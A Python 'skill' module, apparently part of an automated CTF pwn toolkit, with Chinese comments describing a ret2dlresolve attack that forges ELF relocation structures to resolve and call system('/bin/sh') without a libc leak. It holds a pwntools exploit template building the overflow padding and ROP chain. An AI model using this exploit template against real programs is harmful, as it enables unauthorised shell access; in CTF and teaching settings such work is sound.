"""pwn_ret2dlresolve skill：无 libc/无 system 场景的 ret2dlresolve 攻击。

场景（决赛 pwn 难度升级）：程序无 system/无泄露途径/无 libc 附件 →
用 ret2dlresolve（动态链接器解析）伪造 ELF 结构，让程序自己 resolve system
并调用——无需泄露 libc 基址。

流程：
1. 栈溢出控制返回地址 → 布置 fake reloc/sym/str 结构（pwntools Ret2dlresolvePayload）
2. 触发 read 读入 fake 结构 + 控制 return 到 dl_runtime_resolve
3. 参数 rdi = "/bin/sh" → system("/bin/sh")

⚠️ read 裸字节（send）vs fgets 行读（sendline）交互差异（shopping 教训）。
"""

import os


def build_ret2dlresolve_plan(binary: str, read_addr: int = 0, plt0: int = 0,
                             rel_plt: int = 0, got: int = 0) -> dict:
    """构造 ret2dlresolve 利用计划（pwntools 版）。

    参数（无则留 0，由调用方用 ELF 解析填）：
        read_addr: read@plt 地址
        plt0: .plt 段首（dl_runtime_resolve 入口）
        rel_plt: .rel.plt 地址（fake reloc 需在它前面）
        got: .got.plt 地址
    """
    if not (read_addr and plt0 and rel_plt and got):
        return {
            "ok": False,
            "note": "需先解析 ELF：read@plt/.plt首/.rel.plt/.got.plt 地址（pwntools: ELF().plt/.got/.dynamic）",
            "flow": [
                "1. ELF(binary) 解析: read=elf.plt['read'], plt0=elf.get_section_by_name('.plt').header.sh_addr, "
                "rel_plt=elf.dynamic_value_by_tag('DT_JMPREL'), got=elf.got['read']",
                "2. 构造 ret2dlresolve payload（见 build_payload）",
            ],
        }

    return {
        "ok": True,
        "plan": "构造 ret2dlresolve payload → 栈溢出控制返回 → read 读 fake 结构 → "
                "返回到 dl_runtime_resolve 解析 system → system('/bin/sh')",
        "payload_layout": [
            f"stage1: 栈溢出 padding + read@plt({read_addr:#x}) + ret2dlresolve 地址",
            f"stage2: fake reloc（放 {rel_plt:#x} 前面）+ fake sym + fake str（'system'）",
            f"stage3: rdi = '/bin/sh' 字符串地址（放 bss 可写区）",
            f"return 到 plt0({plt0:#x}) 触发 dl_runtime_resolve",
        ],
        "pwntools_hint": (
            "from pwn import *\n"
            "payload = Ret2dlresolvePayload(elf, symbol='system', args=['/bin/sh'])\n"
            "rop = ROP(elf)\n"
            "rop.read(0, payload.data_addr)\n"
            "rop.ret2dlresolve(payload)\n"
            "io.sendline(b'A'*offset + rop.chain() + payload.payload)\n"
            "io.sendline(payload.payload)"
        ),
        "interaction_note": "read 类用 send（裸字节），fgets 类用 sendline（行读）——注意区分",
    }


def pwn_ret2dlresolve(params: dict) -> dict:
    """skill 入口。"""
    binary = params.get("binary", "")
    if not binary or not os.path.exists(binary):
        return {"ok": False, "note": "binary 不存在，请提供 ELF 路径"}
    return build_ret2dlresolve_plan(
        binary,
        read_addr=params.get("read_addr", 0),
        plt0=params.get("plt0", 0),
        rel_plt=params.get("rel_plt", 0),
        got=params.get("got", 0),
    )


def run(params):
    """SkillManager 统一入口：转发到业务函数。"""
    return pwn_ret2dlresolve(params)


def main() -> None:
    import argparse

    parser = argparse.ArgumentParser(description="pwn ret2dlresolve 模板")
    parser.add_argument("--binary", required=True, help="ELF 路径")
    args = parser.parse_args()
    import json

    print(json.dumps(pwn_ret2dlresolve({"binary": args.binary}), ensure_ascii=False, indent=1))


if __name__ == "__main__":
    main()
